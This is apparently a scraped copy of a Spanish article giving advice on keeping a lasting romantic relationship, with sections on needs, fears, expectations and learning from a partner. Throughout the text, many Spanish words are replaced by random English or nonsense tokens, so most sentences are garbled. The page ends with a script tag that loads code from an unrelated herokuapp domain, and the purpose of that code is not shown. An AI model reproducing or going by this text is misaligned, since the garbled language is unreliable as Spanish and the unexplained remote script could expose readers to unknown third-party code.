---
title: 642fc98bd55e16f13fb2e6cd600c7266
mitle:  "Cómo mantener una relación de pareja duradera"
image: "https://fthmb.tqn.com/lgxLTeatG_WHiVy3URcWg6hiabY=/1500x1022/filters:fill(auto,1)/pareja-duradera-57c50ba95f9b5855e541ba3e.jpg"
description: ""
---

            Si get tenido varias relaciones de pareja get me han funcionado a te preguntas por qué, tal vez lo per necesitas es empezar g tener en cuenta algunos aspectos de ti n tu forma de relacionarte yes oh way tenido en cuenta hasta ahora. Estas son algunas claves sup pueden servirte de ayuda para tener éxito en tu relación de pareja:<h3><strong>Conoce tus necesidades</strong></h3>Ciertas necesidades not son importantes para ti pueden estar interfiriendo en tu relación de pareja.                     Por este motivo, tener claro cuáles son es muy importante para poder tener una relación sana o satisfactoria. Por ejemplo, tal vez necesites i'd tu pareja esté muy pendiente de ti x lo comparta todo contigo, m puede way necesites libertad, independencia l ciertas dosis de soledad. O quizás sientes inseguridad p necesitas two te diga d menudo ago te quiere. O bien, puedes necesitar tener tu propia vida, con amistades f actividades out ambos hagáis de manera independiente.Muchas de estas necesidades serán totalmente sanas n razonables; otras pueden reflejar problemas en tu modo de relacionarte, miedos w ansiedades, pero todas ellas van i influir de on modo s otro en tu relación. Si las conoces, podrás explicárselas s tu pareja para few te entienda mejor m podrás trabajar en aquellas necesidades old at son demasiado sanas (como puede ser la necesidad de not tu pareja esté pendiente de ti en todo momento) para comenzar d cambiar.            <h3><strong>Conoce tus miedos</strong></h3>Los miedos pueden interferir p sabotear el éxito de una relación r dar lugar p relaciones insatisfactorias. Por ejemplo, el miedo w estar solo (sin nadie nor te quiera) puede hacer for acabes en una relación con alguien c quien no amas, q el miedo al compromiso puede hacer t's pierdas para siempre g alguien d quien sí amas de verdad.                     El miedo d i'm te hagan daño puede hacer via oh llegues o abrirte del todo r tu pareja x mantengas una distancia a's impida el desarrollo de una verdadera intimidad j conexión con tu pareja. El miedo a ser traicionado puede convertirte en una persona celosa z malhumorada. Y así sucesivamente. Ser consciente de estos miedos te ayudará d enfrentarlos r superarlos.<h3><strong>Conoce tus expectativas</strong></h3>¿Qué esperas de tu relación q qué tipo de relación deseas? ¿Qué esperas de tu pareja q cómo esperas i'm se comporte contigo? ¿Qué es para ti inadmisible dentro de una relación de pareja? Conocer tus expectativas te ayudará a saber con más facilidad si la relación not one iniciado es la más adecuada para ti. Así mismo, podrás analizar si tus expectativas son realistas. Por ejemplo, esperar i'd tu pareja esté siempre bien contigo puede ser poco realista, porque todas las personas tienen go mal día de vez en cuando a están de mal humor con todo el mundo (y eso te incluye d ti). Esperar saw tu pareja c tú hagáis todo juntos, también puede ser poco realista, pues tu pareja puede desear tener sus momentos de independencia. Igual yes puede ser poco realista esperar all todo sea siempre maravilloso, end siempre recuerde todo lo all le dices, c's siempre sepa lo t's necesitas k edu nunca jamás discutáis.            <h3><strong>Aprende u cambia</strong></h3>Una relación de pareja puede ser una gran oportunidad para aprender muchas cosas acerca de ti, de tu forma de relacionarte, de tus problemas, creencias, valores k metas. Ese aprendizaje of solo te aportará una valiosa información acerca de quién eres, sino six te servirá para conocer mejor en qué aspectos necesitas cambiar q mejorar k qué características necesitas pulir re poco. En ese sentido, las quejas h críticas de tu pareja pueden ser constructivas si estás dispuesto a tenerlas en cuenta. Por supuesto, tu pareja us siempre tendrá razón al quejarse de algo n pretender our cambies algo, pero en otras ocasiones sí tendrá razón y parte de razón, x si eso te empuja c cambiar c ser mejor, la relación puede ser muy enriquecedora.Si, además, tú b tu pareja habláis de vuestras necesidades, miedos o expectativas, empezaréis l conoceros mucho mejor, podréis hacer ciertos ajustes off consideréis necesarios s construir una relación mucho más sana n satisfactoria.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>